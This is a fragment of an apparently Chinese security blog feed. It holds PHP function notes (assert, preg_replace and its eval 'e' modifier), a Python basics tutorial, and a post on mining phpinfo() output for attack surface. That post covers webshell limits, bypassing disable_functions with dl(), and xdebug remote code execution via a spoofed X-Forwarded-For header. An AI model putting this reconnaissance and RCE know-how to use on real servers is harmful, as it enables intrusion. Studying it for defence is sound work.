class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Assertion failed at <span class="subst">$file</span>:<span class="subst">$line</span>: <span class="subst">$code</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$desc</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;: <span class="subst">$desc</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置回调函数</span></span><br><span class="line">assert_options(ASSERT_CALLBACK, <span class="string">&#x27;my_assert_handler&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make an assertion that should fail</span></span><br><span class="line">assert(<span class="string">&#x27;2 &lt; 1&#x27;</span>);</span><br><span class="line">assert(<span class="string">&#x27;2 &lt; 1&#x27;</span>, <span class="string">&#x27;Two is less than one&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line">Assertion failed at test.php:<span class="number">21</span>: <span class="number">2</span> &lt; <span class="number">1</span></span><br><span class="line">Assertion failed at test.php:<span class="number">22</span>: <span class="number">2</span> &lt; <span class="number">1</span>: Two is less than one</span><br><span class="line">Expectations (PHP <span class="number">7</span> only)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#没有自定义例外的期望</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">assert(<span class="literal">true</span> == <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hi!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">With zend.assertions set to <span class="number">0</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Hi!</span><br><span class="line">With zend.assertions set to <span class="number">1</span> <span class="keyword">and</span> assert.<span class="built_in">exception</span> set to <span class="number">0</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Warning: assert(): assert(<span class="literal">true</span> == <span class="literal">false</span>) failed in - on line <span class="number">2</span></span><br><span class="line">Hi!</span><br><span class="line">With zend.assertions set to <span class="number">1</span> <span class="keyword">and</span> assert.<span class="built_in">exception</span> set to <span class="number">1</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Fatal <span class="built_in">error</span>: Uncaught <span class="built_in">AssertionError</span>: assert(<span class="literal">true</span> == <span class="literal">false</span>) in -:<span class="number">2</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 -(2): assert(false, &#x27;assert(true == ...&#x27;)</span></span><br><span class="line"><span class="comment">#1 &#123;main&#125;</span></span><br><span class="line">  thrown in - on line <span class="number">2</span></span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line">      </span><br><span class="line"><span class="comment">#带有自定义异常的期望值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomError</span> <span class="keyword">extends</span> <span class="title">AssertionError</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">assert(<span class="literal">true</span> == <span class="literal">false</span>, <span class="keyword">new</span> CustomError(<span class="string">&#x27;True is not false!&#x27;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Hi!&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">With zend.assertions set to <span class="number">0</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Hi!</span><br><span class="line">With zend.assertions set to <span class="number">1</span> <span class="keyword">and</span> assert.<span class="built_in">exception</span> set to <span class="number">0</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Warning: assert(): CustomError: <span class="literal">True</span> is not <span class="literal">false</span>! in -:<span class="number">4</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125; failed in - on line 4</span></span><br><span class="line">Hi!</span><br><span class="line">With zend.assertions set to <span class="number">1</span> <span class="keyword">and</span> assert.<span class="built_in">exception</span> set to <span class="number">1</span>, the above example will output:</span><br><span class="line"></span><br><span class="line">Fatal <span class="built_in">error</span>: Uncaught CustomError: <span class="literal">True</span> is not <span class="literal">false</span>! in -:<span class="number">4</span></span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line">  thrown in - on line <span class="number">4</span></span><br></pre></td></tr></table></figure><p><strong>preg_replace</strong></p><ul><li>用法</li></ul><p>执行一个正则表达式的搜索和替换</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace ( <span class="keyword">mixed</span> <span class="variable">$pattern</span> , <span class="keyword">mixed</span> <span class="variable">$replacement</span> , <span class="keyword">mixed</span> <span class="variable">$subject</span> [, <span class="keyword">int</span> <span class="variable">$limit</span> = -<span class="number">1</span> [, <span class="keyword">int</span> &amp;<span class="variable">$count</span> ]] ) : <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure><p>搜索subject中匹配pattern的部分， 以replacement进行替换。</p><ul><li>参数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pattern<span class="comment">#要搜索的模式。可以使一个字符串或字符串数组。可以使用一些PCRE修饰符。</span></span><br><span class="line"></span><br><span class="line">replacement<span class="comment">#用于替换的字符串或字符串数组。如果这个参数是一个字符串，并且pattern 是一个数组，那么所有的模式都使用这个字符串进行替换。如果pattern和replacement 都是数组，每个pattern使用replacement中对应的 元素进行替换。如果replacement中的元素比pattern中的少， 多出来的pattern使用空字符串进行替换。</span></span><br><span class="line"></span><br><span class="line">replacement<span class="comment">#中可以包含后向引用\\n 或$n，语法上首选后者。 每个 这样的引用将被匹配到的第n个捕获子组捕获到的文本替换。 n 可以是0-99，\\0和$0代表完整的模式匹配文本。 捕获子组的序号计数方式为：代表捕获子组的左括号从左到右， 从1开始数。如果要在replacement 中使用反斜线，必须使用4个(&quot;\\\\&quot;，译注：因为这首先是php的字符串，经过转义后，是两个，再经过 正则表达式引擎后才被认为是一个原文反斜线)。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#当在替换模式下工作并且后向引用后面紧跟着需要是另外一个数字(比如：在一个匹配模式后紧接着增加一个原文数字)， 不能使用\\1这样的语法来描述后向引用。比如， \\11将会使preg_replace() 不能理解你希望的是一个\\1后向引用紧跟一个原文1，还是 一个\\11后向引用后面不跟任何东西。 这种情况下解决方案是使用$&#123;1&#125;1。 这创建了一个独立的$1后向引用, 一个独立的原文1。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#当使用被弃用的 e 修饰符时, 这个函数会转义一些字符(即：&#x27;、&quot;、 \ 和 NULL) 然后进行后向引用替换。当这些完成后请确保后向引用解析完后没有单引号或 双引号引起的语法错误(比如： &#x27;strlen(\&#x27;$1\&#x27;)+strlen(&quot;$2&quot;)&#x27;)。确保符合PHP的 字符串语法，并且符合eval语法。因为在完成替换后， 引擎会将结果字符串作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。</span></span><br><span class="line"></span><br><span class="line">subject<span class="comment">#要进行搜索和替换的字符串或字符串数组。如果subject是一个数组，搜索和替换回在subject 的每一个元素上进行, 并且返回值也会是一个数组。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">limit</span><span class="comment">#每个模式在每个subject上进行替换的最大次数。默认是 -1(无限)。</span></span><br><span class="line"></span><br><span class="line">count<span class="comment">#如果指定，将会被填充为完成的替换次数。</span></span><br></pre></td></tr></table></figure><ul><li>返回值</li></ul><p>如果subject是一个数组， preg_replace()返回一个数组， 其他情况下返回一个字符串。</p><p>如果匹配被查找到，替换后的subject被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL 。</p><p>错误／异常<br>PHP 5.5.0 起， 传入 “\e” 修饰符的时候，会产生一个 E_DEPRECATED 错误； PHP 7.0.0 起，会产生 E_WARNING 错误，同时 “\e” 也无法起效。</p><ul><li>示例</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用后向引用紧跟数值原文</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;April 15, 2003&#x27;</span>;</span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/(\w+) (\d+), (\d+)/i&#x27;</span>;</span><br><span class="line"><span class="variable">$replacement</span> = <span class="string">&#x27;$&#123;1&#125;1,$3&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line">April1,<span class="number">2003</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#preg_replace()中使用基于索引的数组</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;The quick brown fox jumps over the lazy dog.&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">0</span>] = <span class="string">&#x27;/quick/&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">1</span>] = <span class="string">&#x27;/brown/&#x27;</span>;</span><br><span class="line"><span class="variable">$patterns</span>[<span class="number">2</span>] = <span class="string">&#x27;/fox/&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">2</span>] = <span class="string">&#x27;bear&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">1</span>] = <span class="string">&#x27;black&#x27;</span>;</span><br><span class="line"><span class="variable">$replacements</span>[<span class="number">0</span>] = <span class="string">&#x27;slow&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$patterns</span>, <span class="variable">$replacements</span>, <span class="variable">$string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line">The bear black slow jumps over the lazy dog.</span><br><span class="line">对模式和替换内容按key进行排序我们可以得到期望的结果。</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ksort(<span class="variable">$patterns</span>);</span><br><span class="line">ksort(<span class="variable">$replacements</span>);</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$patterns</span>, <span class="variable">$replacements</span>, <span class="variable">$string</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">以上例程会输出：</span><br><span class="line"></span><br><span class="line">The slow black bear jumps over the lazy dog.</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#替换一些值</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$patterns</span> = <span class="keyword">array</span> (<span class="string">&#x27;/(19|20)(\d&#123;2&#125;)-(\d&#123;1,2&#125;)-(\d&#123;1,2&#125;)/&#x27;</span>,</span><br><span class="line">                   <span class="string">&#x27;/^\s*&#123;(\w+)&#125;\s*=/&#x27;</span>);</span><br><span class="line"><span class="variable">$replace</span> = <span class="keyword">array</span> (<span class="string">&#x27;\3/\4/\1\2&#x27;</span>, <span class="string">&#x27;$\1 =&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$patterns</span>, <span class="variable">$replace</span>, <span class="string">&#x27;&#123;startDate&#125; = 1999-5-27&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$startDate</span> = <span class="number">5</span>/<span class="number">27</span>/<span class="number">1999</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#剥离空白字符</span></span><br><span class="line"></span><br><span class="line">这个例子剥离多余的空白字符</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;foo   o&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\s\s+/&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 将会改变为&#x27;foo o&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#使用参数count</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="keyword">array</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="string">&#x27;/\s/&#x27;</span>), <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;xp 4 to&#x27;</span>, -<span class="number">1</span> , <span class="variable">$count</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$count</span>; <span class="comment">//3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line">xp***to</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">**  **</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;php常见危险函数&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;phpinfo()&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变</summary>
      
    
    
    
    <category term="语言" scheme="https://sinevil.github.io/categories/%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="php" scheme="https://sinevil.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phpinfo()中的敏感信息</title>
    <link href="https://sinevil.github.io/2021/08/08/phpinfo/"/>
    <id>https://sinevil.github.io/2021/08/08/phpinfo/</id>
    <published>2021-08-08T10:54:55.000Z</published>
    <updated>2021-08-12T03:39:52.095Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#phpinfo()中的敏感信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#绝对路径</span></span><br><span class="line">(_SERVER[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#支持程序</span></span><br><span class="line">判断服务器是否加载了redis、memcache、mongodb、mysql、curl，如果加载了，那么就可以适当往这几个方面考虑，还可以看看是否支持gopher、是否启了fastcgi</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露真实ip</span></span><br><span class="line">(_SERVER[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>])  SERVER_ADDR</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置文件位置</span></span><br><span class="line">Loaded Configuration File</span><br><span class="line"></span><br><span class="line"><span class="comment">#敏感配置</span></span><br><span class="line">allow_url_include、allow_url_fopen、disable_functions、open_basedir、short_open_tag</span><br><span class="line"></span><br><span class="line"><span class="comment">#session</span></span><br><span class="line">session.save_path=”” –设置session的存储路径</span><br><span class="line">session.save_handler=”” –设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start boolen –指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler string –定义用来序列化/反序列化的处理器名字。默认使用php</span><br><span class="line"></span><br><span class="line"><span class="comment">#server api</span></span><br><span class="line">php解释器与应用层的桥梁。</span><br><span class="line">FPM/FastCGI 多用于和nginx通信，当然也可用于其他web中间件。</span><br><span class="line">Apache 2.0 Handler php为apache提供的专用SAPI</span><br><span class="line">Command Line Interface php命令行</span><br><span class="line"></span><br><span class="line"><span class="comment">#disable_functions</span></span><br><span class="line">有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数</span><br><span class="line"></span><br><span class="line"><span class="comment">#open_basedir</span></span><br><span class="line">这个选项设置了文件读取的时候的目录限制</span><br><span class="line"></span><br><span class="line"><span class="comment">#enable_dll</span></span><br><span class="line">利用扩展库绕过disable_functions，需要使用dl()并且开启这个选项</span><br><span class="line"></span><br><span class="line"><span class="comment">#xdebug 远程rce</span></span><br><span class="line">漏洞利用条件：</span><br><span class="line">xdebug.remote_connect_back 的回连是通过自定义 Header（xdebug.remote_addr_header）、X-Forwarded-For 和 Remote-Addr 三个确定的，依次 fallback，所以即使配置了自定义 Header，也可以通过设置 XFF 头来指定服务器连接，就是让被调试的服务器去连接我们的恶意主机，此时我们的恶意主机就可以和目标服务器进行交互，并且因为是xdebug是支持dbgp的，所以可以此时让恶意主机发送恶意指令到目标服务器让其执行</span><br><span class="line"> 需要在目标站的phpinfo中看到：</span><br><span class="line">xdebug.remote_connect_back =&gt; On =&gt; On</span><br><span class="line">xdebug.remote_cookie_expire_time =&gt; 3600 =&gt; 3600</span><br><span class="line">xdebug.remote_enable =&gt; On =&gt; On</span><br><span class="line">即可使用Xdebug进行连接，尝试直接命令执行</span><br><span class="line"></span><br><span class="line"><span class="comment">#opcache</span></span><br><span class="line">opcache是缓存文件，他的作用就类似于web项目中的静态文件的缓存, 比如我们加载一个网页, 浏览器会自动帮我们把jpg, css缓存起来, 唯独php没有缓存, 每次均需要open文件, 解析代码, 执行代码这一过程, 而opcache即可解决这个问题, 代码会被高速缓存起来, 提升访问速度。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="php" scheme="https://sinevil.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>python</title>
    <link href="https://sinevil.github.io/2021/08/01/python/"/>
    <id>https://sinevil.github.io/2021/08/01/python/</id>
    <published>2021-08-01T10:42:55.000Z</published>
    <updated>2021-08-03T06:28:49.752Z</updated>
    
    <content type="html"><![CDATA[<h2> Python入门到入门 </h2><h4>目录</h4><p><a href="#1">什么是python</a></p><p><a href="#2">编码</a></p><p><a href="#3">注释</a></p><p><a href="#4">标识符</a></p><p><a href="#5">行事项</a></p><p><a href="#6">import和from…import</a></p><p><a href="#7">简易输入输出</a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><h4 id="1">1. Python理解 </h4><ul><li>Python起源</li></ul><p>Python由荷兰数和计算机科学研究学会的Guido van Rossum于1990 年代初设计，作为一门叫做ABC语言的替代品。 Python提供了高效的高级数据结构，还能简单有效地面向对象编程。Python语法和动态类型，以及解释型语言的本质，使它成为多数平台上写脚本和快速开发应用的编程语言；随着版本的不断更新和语言新功能的添加，逐渐被用于独立的、大型项目的开发。</p><ul><li>语言特点</li></ul><p>简单 易读 易维护 用途广泛 速度快 免费 开源 高层次性 可移植性 解释性 面向对象 可扩展性 可扩充性 可嵌入性 丰富的库 规范的代码 高级动态编程 <a href="https://baike.baidu.com/item/Python/407313?fr=aladdin">详情</a></p><h4 id="2">2. 编码 </h4><ul><li>默认情况下python3以<code>TF-8</code>编码，所有字符串都是unicode字符串，当然也可为源码文件指定不同的编码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding :cp-152 -*-</span></span><br></pre></td></tr></table></figure><h4 id="3">3. 注释 </h4><ul><li>python 单行注释</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：<span class="comment">#注释内容</span></span><br></pre></td></tr></table></figure><p>Python解释器遇到<code>#</code>后，会自动忽略它后面整行的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用python输出字符串/数字(说明多行代码功能时)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I lOVE YOU&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">520</span>)</span><br><span class="line"><span class="built_in">print</span>((<span class="number">3</span>+<span class="number">3</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#说明单行代码一般放在代码右侧</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;you are my eyes&quot;</span>) <span class="comment">#输出一串土味情话</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>*<span class="number">8</span>+<span class="number">20</span>) <span class="comment">#用数字表达你的爱意</span></span><br></pre></td></tr></table></figure><ul><li>多行注释</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">格式(一)</span></span><br><span class="line"><span class="string">连续的三个单引号作为开头和结尾</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">格式(二)</span></span><br><span class="line"><span class="string">连续的三个双引号作为开头和结尾</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">* 注意事项</span><br><span class="line"></span><br><span class="line">​```python</span><br><span class="line"><span class="comment">#python多行注释不支持嵌套，以下为错误示例</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">外层注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">内层注释</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">#当注释符以字符串形式出现时，被视为正常代码的一部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注释可以帮助调试程序</span></span><br></pre></td></tr></table></figure><h4 id="4">4. 标识符</h4><p>标识符是编程时使用的名字，用于给变量、函数、语句块等命名，Python 中标识符由字母、数字、下划线组成，不能以数字开头，区分大小写</p><p>以下划线开头的标识符有特殊含义</p><p>单下划线开头的标识符，如：<code>_xxx</code>，表示不能直接访问的类属性，需通过类提供的接口进行访问，不能用<code>from xxx import *</code>导入</p><p>双下划线开头的标识符，如：<code>__xx</code>，表示私有成员</p><p>双下划线开头和结尾的标识符，如：<code>__xx__</code>，表示 Python 中内置标识，如：<code>__init__()</code> 表示类的构造函数</p><h4 id="5"> 5.行事项  </h4><ul><li>行与缩进</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python使用缩进来表示代码块,当缩进格数不一致时，会导致错误</span></span><br><span class="line"><span class="keyword">if</span> Ture:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;flase&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;报错&quot;</span>) </span><br></pre></td></tr></table></figure><ul><li>多行语句</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python通常为一行写完一条语句，但是如果语句很长，我们可以使用 \ 来实现多行语句</span></span><br><span class="line">total = item_one + \</span><br><span class="line">item_two + \</span><br><span class="line">item_three</span><br><span class="line"></span><br><span class="line"><span class="comment">#在[]&#123;&#125;()中的多行语句，不需要使用 \</span></span><br><span class="line">total = [<span class="string">&#x27;itrm_one&#x27;</span>,<span class="string">&#x27;item_two&#x27;</span>]</span><br><span class="line"></span><br><span 